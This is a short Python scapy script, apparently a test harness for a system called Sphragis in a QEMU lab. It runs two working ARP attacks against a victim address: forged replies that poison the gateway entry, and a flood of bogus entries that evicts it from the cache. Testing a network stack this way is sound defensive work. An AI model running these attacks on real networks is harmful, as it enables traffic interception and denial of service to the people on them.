#!/usr/bin/env python3
"""
fuzz_arp.py — ATTACK-NET-001, ATTACK-NET-002

Requires QEMU tap bridge. Requires root.

ATTACK-001: Broadcast ARP reply claiming 10.0.2.2 is at our MAC.
ATTACK-002: Flood ARP cache with 17+ distinct IPs to kick the gateway out.
"""

import sys
import time

try:
    from scapy.all import ARP, Ether, sendp, srp, conf
except ImportError:
    print("scapy required: pip install scapy", file=sys.stderr)
    sys.exit(1)


IFACE = "tap0"
HOST_MAC = "aa:bb:cc:dd:ee:ff"
GATEWAY_IP = "10.0.2.2"
VICTIM_IP = "10.0.2.15"


def attack_001_poison_gateway():
    print("[ATTACK-NET-001] Poisoning gateway 10.0.2.2 to be at", HOST_MAC)
    pkt = (
        Ether(dst="ff:ff:ff:ff:ff:ff", src=HOST_MAC)
        / ARP(
            op=2,  # reply
            hwsrc=HOST_MAC,
            psrc=GATEWAY_IP,
            hwdst="00:00:00:00:00:00",
            pdst=VICTIM_IP,
        )
    )
    for _ in range(10):
        sendp(pkt, iface=IFACE, verbose=False)
        time.sleep(0.2)
    print("    SENT 10x gratuitous ARP replies. Check Sphragis UART for ARP cache state.")


def attack_002_flood_cache():
    print("[ATTACK-NET-002] Flooding ARP cache with 20 bogus entries")
    for i in range(20):
        ip = f"10.0.2.{100 + i}"
        mac = f"02:aa:bb:cc:dd:{i:02x}"
        pkt = (
            Ether(dst="ff:ff:ff:ff:ff:ff", src=mac)
            / ARP(op=2, hwsrc=mac, psrc=ip, hwdst="00:00:00:00:00:00", pdst=VICTIM_IP)
        )
        sendp(pkt, iface=IFACE, verbose=False)
    print("    SENT 20 ARP replies. Gateway entry at slot 0 should now be evicted.")


if __name__ == "__main__":
    conf.verb = 0
    attack_001_poison_gateway()
    attack_002_flood_cache()
